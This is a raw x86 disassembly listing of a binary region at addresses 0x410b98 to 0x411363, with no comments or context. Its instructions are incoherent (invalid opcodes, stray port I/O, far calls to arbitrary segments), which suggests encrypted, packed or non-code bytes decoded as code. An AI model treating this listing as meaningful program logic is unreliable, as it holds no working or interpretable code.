  410b98:	jecxz  0x410bc7
  410b9a:	dec    edi
  410b9b:	stc    
  410b9c:	jp     0x410c16
  410b9e:	imul   edi,ebx,0xee1b26d1
  410ba4:	daa    
  410ba5:	popf   
  410ba6:	out    dx,eax
  410ba7:	test   BYTE PTR [ebx-0x1c],bl
  410baa:	adc    al,0xd8
  410bac:	test   ebx,ecx
  410bae:	fidivr WORD PTR ds:0x303b0938
  410bb4:	mov    dl,0x35
  410bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bb7:	fbld   TBYTE PTR [eax-0x66]
  410bba:	push   cs
  410bbb:	push   ecx
  410bbd:	pop    edx
  410bbe:	addr16 cli 
  410bc0:	scas   eax,DWORD PTR es:[edi]
  410bc1:	lea    eax,[edx]
  410bc3:	mov    ss,WORD PTR [ecx-0x7c]
  410bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bc7:	or     DWORD PTR [edi+edx*8-0x26],ecx
  410bcb:	pop    ecx
  410bcc:	add    DWORD PTR [ebx],esi
  410bce:	cdq    
  410bcf:	inc    esp
  410bd0:	jae    0x410be9
  410bd2:	lods   al,BYTE PTR ds:[esi]
  410bd3:	mov    dh,0xd0
  410bd5:	push   ecx
  410bd6:	dec    esp
  410bd7:	jg     0x410bb9
  410bd9:	adc    eax,0x747a0ab1
  410bde:	inc    eax
  410bdf:	or     DWORD PTR [ebx-0x7c],ebp
  410be2:	cmp    ecx,DWORD PTR [eax]
  410be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410be5:	pop    edi
  410be6:	sub    DWORD PTR [ebx+0x0],ecx
  410be9:	jl     0x410b81
  410beb:	mov    ch,0xeb
  410bed:	sub    edi,ecx
  410bef:	js     0x410bad
  410bf1:	in     eax,dx
  410bf2:	pop    edx
  410bf3:	inc    eax
  410bf4:	cmp    ecx,eax
  410bf6:	(bad)  
  410bf7:	out    0x42,ax
  410bfa:	add    BYTE PTR [eax+0x4467283],dh
  410c00:	cdq    
  410c01:	or     dh,BYTE PTR [esi]
  410c03:	add    dh,bh
  410c05:	loop   0x410c35
  410c07:	mov    esp,0x73bb09fb
  410c0c:	addr16 out dx,eax
  410c0e:	sbb    cl,cl
  410c10:	cwde   
  410c11:	mov    dl,0x93
  410c13:	dec    ecx
  410c14:	mov    dl,0xee
  410c16:	ins    DWORD PTR es:[edi],dx
  410c17:	sbb    al,0x4b
  410c19:	aaa    
  410c1a:	fiadd  WORD PTR [ebp-0x592c636d]
  410c20:	pop    es
  410c21:	and    bh,bl
  410c23:	dec    esp
  410c24:	push   esi
  410c25:	popf   
  410c26:	fwait
  410c27:	loope  0x410c0b
  410c29:	jo     0x410c77
  410c2b:	and    al,0x9a
  410c2d:	enter  0x5f71,0xbe
  410c31:	enter  0x385b,0x2a
  410c35:	xchg   esi,eax
  410c36:	fadd   QWORD PTR [edi+0x7f]
  410c39:	aas    
  410c3a:	mov    ?,WORD PTR [edx]
  410c3c:	adc    eax,0xde4e2ad0
  410c41:	or     ecx,eax
  410c43:	inc    edx
  410c44:	xchg   BYTE PTR [edi],cl
  410c46:	cmp    ebp,DWORD PTR [ecx+0x52047217]
  410c4c:	popa   
  410c4d:	int3   
  410c4e:	test   DWORD PTR [ecx+eiz*1+0x39549e2d],ecx
  410c55:	xor    al,0x84
  410c57:	mov    al,ds:0x43210ba4
  410c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c5d:	sub    edx,edi
  410c5f:	pop    edi
  410c60:	jae    0x410cd7
  410c62:	repnz aas 
  410c64:	dec    edi
  410c65:	mov    ds:0x9793098d,eax
  410c6a:	fistp  WORD PTR [edx+0x3a]
  410c6d:	cdq    
  410c6e:	imul   ebx,DWORD PTR [ebp+0x17],0xffffffb9
  410c72:	sbb    DWORD PTR [ebp-0x72341716],eax
  410c78:	mov    edi,0xd6509b3d
  410c7d:	push   0x70
  410c7f:	sbb    eax,0x104f22c5
  410c84:	dec    ebp
  410c85:	jno    0x410c59
  410c87:	xchg   esp,eax
  410c88:	dec    esp
  410c89:	retf   
  410c8a:	(bad)
  410c8f:	(bad)  
  410c90:	mov    ah,0x4f
  410c92:	mov    ch,0x27
  410c94:	sbb    BYTE PTR [esi-0x669966e7],al
  410c9a:	ret    0x10bf
  410c9d:	pop    esi
  410c9e:	bound  esi,QWORD PTR [ebp-0x2ee6eec5]
  410ca4:	imul   ebp,DWORD PTR [edi+0x7b35e5ef],0x299e4966
  410cae:	sub    DWORD PTR [ecx],edx
  410cb0:	add    dh,dh
  410cb2:	inc    esi
  410cb3:	mov    ecx,0x9785db44
  410cb8:	inc    edi
  410cb9:	or     eax,0x7107b3af
  410cbe:	ins    BYTE PTR es:[edi],dx
  410cbf:	cmp    esi,DWORD PTR [esi]
  410cc1:	cmp    bl,BYTE PTR [edi+0x3d]
  410cc4:	into   
  410cc5:	cmp    DWORD PTR [ebp+0x2ac9c566],esi
  410ccb:	jnp    0x410c65
  410ccd:	fcmovnbe st,st(4)
  410ccf:	mov    eax,0x5cff944d
  410cd4:	xchg   ebp,eax
  410cd5:	mov    ecx,0xe39fa381
  410cda:	or     BYTE PTR [edi-0x6f9f1cb9],ah
  410ce0:	xor    DWORD PTR [ebp+0x6af696fb],ecx
  410ce6:	test   DWORD PTR [esi-0x5899395c],esp
  410cec:	mov    cs,WORD PTR [ebp-0xf]
  410cef:	repz mov eax,0x9b1e2c0a
  410cf5:	(bad)  
  410cf6:	in     al,0xa
  410cf8:	(bad)  
  410cf9:	mov    bl,0xd6
  410cfb:	adc    DWORD PTR [edx-0x4],edx
  410cfe:	pop    ds
  410cff:	inc    edi
  410d00:	mov    eax,DWORD PTR [ebx-0x17]
  410d03:	pop    ds
  410d04:	cli    
  410d05:	cmp    edx,DWORD PTR [ecx-0x38]
  410d08:	mov    ah,0x90
  410d0a:	push   ebx
  410d0b:	jnp    0x410d6a
  410d0d:	inc    edx
  410d0e:	push   0x58
  410d10:	mov    es,WORD PTR [edi]
  410d12:	sub    eax,0x10755382
  410d17:	in     eax,0xdd
  410d19:	add    eax,0x77375396
  410d1e:	leave  
  410d1f:	jb     0x410d7c
  410d21:	sbb    DWORD PTR [edi],edx
  410d23:	fcom   QWORD PTR [edx+0x2b]
  410d26:	jnp    0x4ff08f1
  410d2c:	inc    ebp
  410d2d:	sub    edi,DWORD PTR [esi+0x70]
  410d30:	rcl    BYTE PTR [esi-0x737934],1
  410d36:	cs int 0x4e
  410d39:	shr    BYTE PTR [edx-0x34],0x76
  410d3d:	xchg   esp,eax
  410d3e:	sub    al,0xf4
  410d40:	in     eax,0x33
  410d42:	pop    edi
  410d43:	jecxz  0x410cd4
  410d45:	mov    edi,0xe8126f33
  410d4a:	or     eax,0xbe5887c8
  410d4f:	xchg   edx,eax
  410d50:	in     al,dx
  410d51:	inc    esi
  410d52:	mov    ebx,ss
  410d54:	dec    ebp
  410d55:	pop    ss
  410d56:	inc    ebx
  410d57:	adc    al,cl
  410d59:	jnp    0x410d85
  410d5b:	xchg   esp,eax
  410d5c:	sahf   
  410d5d:	and    al,0x5e
  410d5f:	add    eax,0x44828e59
  410d64:	or     eax,0xaac0190c
  410d69:	cmc    
  410d6a:	arpl   WORD PTR [edx],bp
  410d6c:	adc    ecx,0x917e2b06
  410d72:	and    eax,0xf85a6732
  410d77:	jge    0x410d6a
  410d79:	(bad)  
  410d7a:	dec    BYTE PTR [ecx-0x5b]
  410d7d:	lea    esi,[ebx+eax*1-0x76]
  410d81:	mov    edx,0x895abc54
  410d86:	xor    eax,0x24019da0
  410d8b:	repnz xchg ebx,eax
  410d8d:	xchg   esi,eax
  410d8e:	cmp    dl,BYTE PTR [edi]
  410d90:	fwait
  410d91:	es popa 
  410d93:	sub    dl,BYTE PTR [ecx+0x2c6e9e0e]
  410d99:	call   0x2356:0xf41b713f
  410da0:	ins    BYTE PTR es:[edi],dx
  410da1:	push   cs
  410da2:	inc    edi
  410da3:	pop    ecx
  410da4:	test   DWORD PTR [ecx-0x76],ebp
  410da7:	add    BYTE PTR [edx],ch
  410da9:	outs   dx,BYTE PTR ds:[esi]
  410daa:	fcmovne st,st(7)
  410dac:	pop    ss
  410dad:	add    BYTE PTR [ecx+ebx*8-0x4d2b1ced],bl
  410db4:	dec    ebp
  410db5:	fcmovnbe st,st(7)
  410db7:	js     0x410e00
  410db9:	enter  0xb2e,0xae
  410dbd:	pop    ss
  410dbe:	push   ebx
  410dbf:	test   eax,0xbc83dd14
  410dc4:	inc    esi
  410dc5:	sahf   
  410dc6:	fistp  WORD PTR [esi+0x20]
  410dc9:	pusha  
  410dca:	scas   eax,DWORD PTR es:[edi]
  410dcb:	imul   edi,DWORD PTR [edi],0xa3c91a67
  410dd1:	aam    0x5a
  410dd3:	sub    BYTE PTR [edx],cl
  410dd5:	fild   DWORD PTR [edx-0x6b164948]
  410ddb:	jno    0x410dbf
  410ddd:	pop    ss
  410dde:	push   esp
  410de0:	sbb    DWORD PTR [eax],ebp
  410de2:	dec    esi
  410de3:	cmp    edi,DWORD PTR [edx]
  410de5:	dec    esp
  410de6:	scas   al,BYTE PTR es:[edi]
  410de7:	push   0xfffffff7
  410de9:	sub    BYTE PTR [esi],0x8d
  410dec:	lock mov es:0xc2322239,eax
  410df3:	mov    al,ds:0x923a1202
  410df8:	push   ds
  410df9:	inc    ebx
  410dfa:	push   ebp
  410dfb:	scas   al,BYTE PTR es:[edi]
  410dfc:	xchg   esi,eax
  410dfd:	je     0x410e6d
  410dff:	add    BYTE PTR [edx-0x3b],dl
  410e02:	xchg   edi,eax
  410e03:	push   ss
  410e04:	test   al,0x28
  410e06:	xor    eax,0xa2a5bd6e
  410e0b:	sahf   
  410e0c:	mov    esi,0x15ed99ad
  410e11:	jbe    0x410dd1
  410e13:	ins    BYTE PTR es:[edi],dx
  410e14:	or     bl,BYTE PTR [eax+0x45]
  410e17:	jecxz  0x410da7
  410e19:	adc    al,0x85
  410e1b:	aad    0x78
  410e1d:	jg     0x410e40
  410e1f:	ja     0x410dda
  410e21:	adc    eax,0xee825b84
  410e26:	daa    
  410e27:	jmp    FWORD PTR gs:[esi+0x35]
  410e2b:	cmp    esi,DWORD PTR [ebx-0x1b9b0ddb]
  410e31:	sub    edx,DWORD PTR [eax+esi*4-0x59852972]
  410e38:	(bad)  
  410e39:	push   ebx
  410e3a:	xchg   DWORD PTR [ebx+0x1e],ebp
  410e3d:	ss push edi
  410e3f:	xor    ah,al
  410e41:	mov    cl,0x3b
  410e43:	mov    dl,0xb
  410e45:	mov    eax,ds:0x65128526
  410e4a:	push   0x3a
  410e4c:	mov    BYTE PTR [edx+0x3c537204],ah
  410e52:	repnz inc ebp
  410e54:	das    
  410e55:	das    
  410e56:	add    edi,DWORD PTR [edi+0x74]
  410e59:	mov    al,0x86
  410e5b:	fucomip st,st(5)
  410e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e5f:	ja     0x410e60
  410e61:	push   esi
  410e62:	sar    BYTE PTR [ecx],1
  410e64:	lods   al,BYTE PTR ds:[esi]
  410e65:	push   esi
  410e66:	add    esi,esi
  410e68:	add    eax,0x859bc20e
  410e6d:	mov    WORD PTR [edi+0xe94a248],fs
  410e73:	add    ebp,eax
  410e75:	fmul   DWORD PTR [edx-0x6a]
  410e78:	pop    ebp
  410e79:	mov    eax,ds:0x6ab1877
  410e7e:	clc    
  410e7f:	jne    0x410e50
  410e81:	xchg   edi,eax
  410e82:	lea    esi,[eax]
  410e84:	cmp    al,0x4d
  410e86:	dec    esi
  410e87:	imul   ebp,esp,0xe
  410e8a:	dec    ebx
  410e8b:	add    eax,0x74c62681
  410e90:	icebp  
  410e91:	inc    esp
  410e92:	mov    al,ds:0xa2711daf
  410e97:	dec    ebx
  410e98:	dec    esi
  410e99:	jl     0x410e64
  410e9b:	or     eax,0x7a5b051c
  410ea0:	lods   eax,DWORD PTR ds:[esi]
  410ea1:	cmp    si,bx
  410ea4:	dec    ebx
  410ea5:	ins    BYTE PTR es:[edi],dx
  410ea6:	call   0x2c0ee91f
  410eab:	mov    dl,0x53
  410ead:	adc    dh,BYTE PTR [edx+0x51]
  410eb0:	dec    esi
  410eb1:	shl    BYTE PTR [ecx+esi*2+0x1e6ea1fa],1
  410eb8:	not    BYTE PTR [esi+0x29]
  410ebb:	sub    DWORD PTR [ebx+0x6b726ddf],esp
  410ec1:	call   0x1136:0xe5345115
  410ec8:	dec    edi
  410ec9:	pusha  
  410eca:	pop    ds
  410ecb:	loop   0x410ee2
  410ecd:	lds    edx,FWORD PTR [edx+0x39]
  410ed0:	mul    BYTE PTR [ebp+esi*4-0x357e191]
  410ed7:	sbb    dl,dh
  410ed9:	mov    ebp,0x1e11f67a
  410ede:	std    
  410edf:	ffreep st(1)
  410ee1:	dec    edx
  410ee2:	pop    edi
  410ee3:	stos   BYTE PTR es:[edi],al
  410ee4:	cli    
  410ee5:	inc    eax
  410ee6:	xor    eax,0x1bfa10c0
  410eeb:	aam    0x53
  410eed:	cwde   
  410eee:	jnp    0x410f3c
  410ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef1:	dec    esp
  410ef2:	xchg   esp,eax
  410ef3:	imul   ecx,DWORD PTR [eax],0xffffff99
  410ef6:	push   esp
  410ef7:	jp     0x410f40
  410ef9:	add    eax,0x6c0db59a
  410efe:	push   eax
  410eff:	test   bh,dh
  410f01:	popa   
  410f02:	dec    esi
  410f03:	pop    ss
  410f04:	aaa    
  410f05:	dec    ebx
  410f06:	cld    
  410f07:	or     al,0xc1
  410f09:	cwde   
  410f0a:	pop    ss
  410f0b:	push   ebp
  410f0c:	inc    edi
  410f0d:	outs   dx,BYTE PTR ds:[esi]
  410f0e:	xor    BYTE PTR [ebp+0x2f],0xaa
  410f12:	sub    eax,0xfc9cda20
  410f17:	ins    DWORD PTR es:[edi],dx
  410f18:	ja     0x410eef
  410f1a:	cli    
  410f1b:	pop    ebp
  410f1c:	mov    dh,0x4b
  410f1e:	and    BYTE PTR [ecx+0x4584cfcf],dh
  410f24:	cmc    
  410f25:	stc    
  410f26:	in     eax,0xa7
  410f28:	hlt    
  410f29:	lock xchg edx,eax
  410f2b:	repnz mov cl,0x4d
  410f2e:	cmp    cl,BYTE PTR [ebx-0x701d5d7a]
  410f34:	pop    ss
  410f35:	ret    
  410f36:	lods   al,BYTE PTR ss:[esi]
  410f38:	ins    BYTE PTR es:[edi],dx
  410f39:	mov    ds:0x20cf51a4,al
  410f3e:	sub    al,0x8b
  410f40:	stos   BYTE PTR es:[edi],al
  410f41:	push   eax
  410f42:	xchg   esp,eax
  410f43:	div    edx
  410f45:	es out 0x4c,al
  410f48:	pop    ecx
  410f49:	in     eax,0x20
  410f4b:	div    BYTE PTR [edx-0x2f389a44]
  410f51:	(bad)  
  410f52:	or     eax,0x2910b02c
  410f57:	jg     0x410fad
  410f59:	rcl    dh,1
  410f5b:	and    ebx,esi
  410f5d:	dec    eax
  410f5e:	sub    esi,DWORD PTR [eax+0x75]
  410f61:	call   0xd6ca:0xcbf30f96
  410f68:	stos   BYTE PTR es:[edi],al
  410f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f6a:	data16 jae 0x410fcd
  410f6d:	mov    DWORD PTR [esi+edi*2-0x2f],ebx
  410f71:	jle    0x410f0d
  410f73:	cwde   
  410f74:	jmp    0xcb1e0ae3
  410f79:	ins    DWORD PTR es:[edi],dx
  410f7a:	add    DWORD PTR [edi+edi*4+0x1ecdd980],eax
  410f81:	icebp  
  410f82:	(bad)  
  410f84:	mov    gs,WORD PTR [ebx]
  410f86:	mov    DWORD PTR [ebp+0x4289f6d],0x14a45420
  410f90:	jg     0x411002
  410f92:	popa   
  410f93:	inc    edx
  410f94:	and    al,0x2a
  410f96:	mov    ah,BYTE PTR [eax+0x67]
  410f99:	pop    ss
  410f9a:	pop    edx
  410f9b:	inc    edx
  410f9c:	pop    es
  410f9d:	lds    ebx,FWORD PTR [ebx-0x372de027]
  410fa3:	cmp    ebp,esp
  410fa5:	int    0x1c
  410fa7:	sbb    eax,0xbaf70435
  410fac:	enter  0xf7b4,0x92
  410fb0:	lea    ebx,[ecx-0x75]
  410fb3:	mov    esi,0xbdeb887d
  410fb8:	and    DWORD PTR [ecx+0xc86ae8d],ebx
  410fbe:	adc    al,0x14
  410fc0:	xchg   ecx,eax
  410fc1:	out    dx,al
  410fc2:	mov    eax,0xf0ae3994
  410fc7:	or     eax,0x47e1ede8
  410fcc:	inc    edi
  410fcd:	sbb    eax,0xc811029c
  410fd2:	push   eax
  410fd3:	jge    0x410f7c
  410fd5:	push   ebx
  410fd6:	jmp    0xf817:0xc1e15352
  410fdd:	cmp    ch,bl
  410fdf:	popf   
  410fe0:	mov    al,bl
  410fe2:	jg     0x41100b
  410fe4:	dec    edx
  410fe5:	pop    ds
  410fe6:	leave  
  410fe7:	aas    
  410fe8:	cmp    dh,al
  410fea:	jmp    0xba0d39fe
  410fef:	pop    ebp
  410ff0:	lea    eax,[edi]
  410ff2:	test   al,0x3e
  410ff4:	fadd   DWORD PTR [esi]
  410ff6:	sbb    DWORD PTR [eax-0x58272c1b],0x9268a200
  411000:	sbb    ch,bh
  411002:	js     0x411061
  411004:	sahf   
  411005:	mov    bl,0x82
  411007:	mov    BYTE PTR [esi-0x63],dl
  41100a:	loopne 0x411082
  41100c:	out    dx,al
  41100d:	aas    
  41100e:	call   0xebe5:0xb64ebbb7
  411015:	lods   eax,DWORD PTR ds:[esi]
  411016:	push   0xa0ecedc2
  41101b:	xlat   BYTE PTR ds:[ebx]
  41101c:	push   0x62a41073
  411021:	xchg   dl,cl
  411023:	call   0x9be1:0x919492ce
  41102a:	mov    WORD PTR [esi+0x6743c7f8],gs
  411030:	ds jle 0x5758fec5
  411037:	call   0xb668:0x98d2980
  41103e:	out    0x43,al
  411040:	ins    BYTE PTR es:[edi],dx
  411041:	call   0x52b9:0x20639109
  411048:	rcr    al,cl
  41104a:	sub    esp,edx
  41104c:	pushw  ds
  41104e:	popa   
  41104f:	add    BYTE PTR ds:[ecx-0x4d],dh
  411053:	lods   al,BYTE PTR ds:[esi]
  411054:	jb     0x4110bd
  411056:	add    al,0xa5
  411058:	or     eax,0x94027613
  41105d:	and    ebp,ebx
  41105f:	in     eax,0xbb
  411061:	mov    ds:0x8b68f625,eax
  411066:	mov    esp,0x5c8c0105
  41106b:	(bad)  
  41106c:	adc    eax,DWORD PTR [eax+0xa5d9ad1]
  411072:	jo     0x4110e0
  411074:	cli    
  411075:	or     DWORD PTR [eax-0x59],ecx
  411078:	es jmp 0x87add8ba
  41107e:	xchg   DWORD PTR [eax],esi
  411080:	jnp    0x411023
  411082:	add    eax,DWORD PTR [ebx]
  411084:	push   edx
  411085:	outs   dx,BYTE PTR ds:[esi]
  411086:	dec    edx
  411087:	int    0xba
  411089:	dec    ecx
  41108a:	loope  0x411068
  41108c:	cld    
  41108d:	je     0x41105a
  41108f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411090:	push   edx
  411091:	fdivr  st(0),st
  411093:	nop
  411094:	test   DWORD PTR [eax+0x19],eax
  411097:	cmp    DWORD PTR [ebp+0x41221640],ebx
  41109d:	ins    BYTE PTR es:[edi],dx
  41109e:	mov    bl,0x62
  4110a0:	jnp    0x411077
  4110a2:	add    edx,DWORD PTR [ecx-0x8]
  4110a5:	jbe    0x41109a
  4110a7:	sahf   
  4110a8:	nop
  4110a9:	fwait
  4110aa:	jg     0x4110af
  4110ac:	pop    edx
  4110ad:	(bad)
  4110b1:	es mov bh,0x86
  4110b4:	mul    DWORD PTR [esp+edx*2-0x2e6cc291]
  4110bb:	xor    al,0x63
  4110bd:	clc    
  4110be:	add    eax,0xfceb1c6a
  4110c3:	jnp    0x41105b
  4110c5:	dec    al
  4110c7:	sbb    DWORD PTR [esi],esp
  4110c9:	stos   BYTE PTR es:[edi],al
  4110ca:	mov    al,ds:0x63b8f0f4
  4110cf:	add    BYTE PTR [edx-0xf],0x85
  4110d3:	out    0xe,al
  4110d5:	(bad)  
  4110d7:	or     DWORD PTR [edx+esi*8],ebp
  4110da:	dec    ebp
  4110dc:	cmp    ebx,DWORD PTR [esi+eax*8+0x3d]
  4110e0:	add    BYTE PTR [edi],0x36
  4110e3:	rol    BYTE PTR [esi-0x54d5fe66],cl
  4110e9:	imul   DWORD PTR [esi-0x6c]
  4110ec:	ins    DWORD PTR es:[edi],dx
  4110ed:	imul   edi,ecx,0xf247a116
  4110f3:	or     bl,ch
  4110f5:	adc    ebp,esp
  4110f7:	ret    
  4110f8:	cmp    BYTE PTR [eax+0x63501212],cl
  4110fe:	fstp   DWORD PTR [ebx]
  411100:	sti    
  411101:	jnp    0x4110ad
  411103:	add    DWORD PTR [edx+0x38],ecx
  411106:	sbb    DWORD PTR [edi+0x4d],eax
  411109:	icebp  
  41110a:	jle    0x4110eb
  41110c:	mov    dh,0xec
  41110e:	enter  0x3729,0x29
  411112:	cmp    BYTE PTR [ebx],ch
  411114:	mov    dl,0xc5
  411116:	enter  0x541d,0x2c
  41111a:	xchg   esp,eax
  41111b:	pop    ss
  41111c:	es out dx,al
  41111e:	in     eax,0x43
  411120:	add    eax,0xa7a57f96
  411125:	adc    bh,dh
  411127:	dec    DWORD PTR [eax]
  411129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41112a:	test   eax,edx
  41112c:	or     edi,ebx
  41112e:	sub    al,BYTE PTR [esi+ebp*4-0x21721e78]
  411135:	mov    DWORD PTR ds:0xbc8d4174,ebx
  41113b:	(bad)
  41113e:	adc    eax,0x3df95eb2
  411143:	mov    ds:0xe3768ec2,al
  411148:	gs ss mov ebp,0x13a9377
  41114f:	in     eax,0x4c
  411151:	pop    edx
  411152:	mov    edx,0x1aae2c65
  411157:	ret    0x41a9
  41115a:	(bad)  
  41115b:	stos   BYTE PTR es:[edi],al
  41115c:	dec    edi
  41115d:	push   edx
  41115e:	jmp    0xc413aeba
  411163:	lds    esp,FWORD PTR [esi-0x40163c89]
  411169:	mov    dh,0xb5
  41116b:	pop    eax
  41116c:	push   es
  41116d:	mov    bl,ch
  41116f:	xchg   esp,eax
  411170:	pop    ecx
  411171:	and    eax,0xdb83f926
  411176:	imul   edi,esi,0xffffffb4
  411179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41117a:	enter  0x7201,0x30
  41117e:	adc    al,0x1d
  411180:	int3   
  411181:	(bad)  
  411182:	(bad)  
  411183:	push   edx
  411184:	xor    BYTE PTR [esi+0xd],bl
  411187:	pop    eax
  411188:	pop    ecx
  411189:	mov    DWORD PTR [edx+eax*1],0x1b5d47ad
  411190:	jg     0x4111cb
  411192:	inc    ecx
  411193:	loope  0x4111c5
  411195:	out    dx,eax
  411196:	xchg   BYTE PTR [eax-0x71],al
  411199:	xchg   ebp,eax
  41119a:	mov    esi,0x5ac5ead2
  41119f:	mov    bh,0x3
  4111a2:	or     eax,0x233b7094
  4111a7:	popf   
  4111a8:	mov    dh,0xdd
  4111aa:	popa   
  4111ab:	fwait
  4111ac:	ret    0x2c34
  4111af:	pop    edi
  4111b0:	sub    dl,cl
  4111b2:	ins    DWORD PTR es:[edi],dx
  4111b3:	repnz mov ds:0xbf546660,eax
  4111b9:	gs inc edi
  4111bb:	cld    
  4111bc:	jp     0x41118f
  4111be:	sub    esi,ebp
  4111c0:	std    
  4111c1:	clc    
  4111c2:	neg    ecx
  4111c4:	push   eax
  4111c5:	ins    DWORD PTR es:[edi],dx
  4111c6:	fnstcw WORD PTR [ebp+0x4e]
  4111c9:	sbb    DWORD PTR [ebp-0x76d62cb2],0x9e5d0523
  4111d3:	and    ebp,edx
  4111d5:	push   ecx
  4111d6:	je     0x4111ae
  4111d8:	test   al,0xac
  4111da:	dec    ecx
  4111db:	push   edi
  4111dc:	inc    edx
  4111dd:	(bad)  
  4111de:	and    edi,ecx
  4111e0:	push   esp
  4111e1:	inc    edi
  4111e2:	inc    ebp
  4111e3:	mov    ah,0x89
  4111e5:	dec    esi
  4111e6:	ins    DWORD PTR es:[edi],dx
  4111e7:	pop    esi
  4111e8:	jnp    0x411209
  4111ea:	cmp    DWORD PTR [edx],ecx
  4111ec:	iret   
  4111ed:	dec    edi
  4111ee:	dec    ebx
  4111ef:	sub    eax,esp
  4111f1:	jmp    0xf448:0x54e92771
  4111f8:	mov    edx,0x8325555d
  4111fd:	out    dx,eax
  4111fe:	leave  
  4111ff:	mov    al,ds:0x82e6e827
  411204:	add    eax,0xa9a48c4f
  411209:	cmc    
  41120a:	inc    ecx
  41120b:	rcl    DWORD PTR [ecx],cl
  41120d:	pop    ebx
  41120e:	sbb    al,0x10
  411210:	xor    esi,DWORD PTR [ebx-0x18]
  411213:	cmp    ah,ch
  411215:	push   0x57
  411217:	push   es
  411218:	xor    al,bl
  41121a:	mov    ebx,0xbb1ba9f1
  41121f:	xchg   BYTE PTR [ecx],bh
  411221:	int3   
  411222:	neg    ebx
  411224:	xchg   esi,eax
  411225:	sbb    BYTE PTR ds:0x84a164b4,ah
  41122b:	cld    
  41122c:	shr    DWORD PTR [ebx],1
  41122e:	outs   dx,DWORD PTR ds:[esi]
  41122f:	mov    ds:0x26efb13d,eax
  411234:	out    0x8d,al
  411236:	and    dh,BYTE PTR [edx]
  411238:	ror    BYTE PTR [edx-0x9],1
  41123b:	mov    ds:0xa8d17324,al
  411240:	mov    edx,0x93bbf0a1
  411245:	aas    
  411246:	stc    
  411247:	cdq    
  411248:	lahf   
  411249:	add    BYTE PTR [esi+edi*2+0x6a21c668],al
  411250:	ins    DWORD PTR es:[edi],dx
  411251:	and    al,0x3
  411253:	sti    
  411254:	push   0xc0d998a5
  411259:	enter  0x197d,0x95
  41125d:	jbe    0x4112d6
  41125f:	adc    esi,DWORD PTR [esp+edi*2]
  411262:	test   esp,0xecaab237
  411268:	sbb    DWORD PTR [ecx],eax
  41126a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41126b:	call   0xc2197281
  411270:	rol    DWORD PTR [ebx],1
  411272:	out    0x84,al
  411274:	xor    edx,ebp
  411276:	add    al,0x5d
  411278:	sar    DWORD PTR [ecx],1
  41127a:	bsr    esp,DWORD PTR [ebp-0x46eb8041]
  411281:	loop   0x41127c
  411283:	mov    bh,0x6d
  411285:	xchg   esp,eax
  411286:	ret    0x7cfa
  411289:	loop   0x4112e0
  41128b:	mov    ds:0x5e8a3c23,al
  411290:	adc    DWORD PTR ds:0xb40b67f9,esi
  411296:	imul   BYTE PTR [edi+ebp*2+0x3215f0e0]
  41129d:	xchg   edi,eax
  41129e:	pusha  
  41129f:	clc    
  4112a0:	jp     0x411321
  4112a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112a3:	aam    0x51
  4112a5:	xchg   BYTE PTR [eax+0x24],bh
  4112a8:	or     DWORD PTR [ecx-0x214263e9],0x31
  4112af:	aas    
  4112b0:	inc    ebp
  4112b1:	mov    dl,0x7b
  4112b3:	jno    0x4112e1
  4112b5:	fild   QWORD PTR [ebx-0xa]
  4112b8:	sar    DWORD PTR [edx-0x6c],1
  4112bb:	pop    esp
  4112bc:	mov    esi,0xb4d8854d
  4112c1:	inc    edx
  4112c2:	xchg   ecx,eax
  4112c3:	aas    
  4112c4:	push   0xd55ccde7
  4112c9:	fwait
  4112ca:	inc    edx
  4112cb:	arpl   WORD PTR [edx-0x3bb72145],ax
  4112d1:	ret    
  4112d2:	outs   dx,BYTE PTR ds:[esi]
  4112d3:	push   esi
  4112d4:	mov    ebx,0x311f673b
  4112d9:	imul   ebp,DWORD PTR [ebx-0x5b],0xfa463bcc
  4112e0:	cli    
  4112e1:	push   edx
  4112e2:	repz cmp DWORD PTR [edi],ebx
  4112e5:	rcr    edi,1
  4112e7:	cli    
  4112e8:	and    DWORD PTR [eax],0x6049581f
  4112ee:	div    ebp
  4112f0:	(bad)  
  4112f1:	popf   
  4112f2:	push   edi
  4112f3:	push   ss
  4112f4:	mov    bl,0x2b
  4112f6:	push   ecx
  4112f7:	jo     0x4112db
  4112f9:	xchg   ecx,eax
  4112fa:	xchg   ebp,eax
  4112fb:	pop    edi
  4112fc:	mov    ebp,0x9dd57930
  411301:	mov    cl,0xcb
  411303:	outs   dx,BYTE PTR ds:[esi]
  411304:	inc    esp
  411305:	into   
  411306:	in     eax,0x5d
  411308:	push   ecx
  411309:	cmp    DWORD PTR [ebp+0x68f87b9],esp
  41130f:	and    BYTE PTR [eax-0x1b71b647],ah
  411315:	sub    al,0xa
  411317:	stc    
  411318:	outs   dx,BYTE PTR ds:[esi]
  411319:	dec    esp
  41131a:	clc    
  41131b:	test   eax,0x5ff93b6d
  411320:	sbb    eax,0xcdb65696
  411325:	xor    eax,0xba84eb69
  41132a:	outs   dx,DWORD PTR ds:[esi]
  41132b:	retf   
  41132c:	fucomp st(1)
  41132e:	enter  0x824a,0x4d
  411332:	popa   
  411333:	rcl    BYTE PTR [edx-0x4ba02aac],1
  411339:	inc    ebp
  41133a:	jl     0x41139a
  41133c:	or     bh,BYTE PTR [esi]
  41133e:	retf   
  41133f:	cmp    al,0xff
  411341:	int3   
  411342:	dec    ebx
  411343:	cmp    al,0xdb
  411345:	xchg   DWORD PTR [ecx-0x46],edi
  411348:	js     0x4112d6
  41134a:	sbb    eax,0x76983df9
  41134f:	dec    edi
  411350:	retf   
  411351:	push   ds
  411352:	mov    ch,ah
  411354:	xchg   DWORD PTR [ecx-0x6897330a],edx
  41135a:	aaa    
  41135b:	and    dh,ah
  41135d:	(bad)  [edi-0x1ed79b68]
  411363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
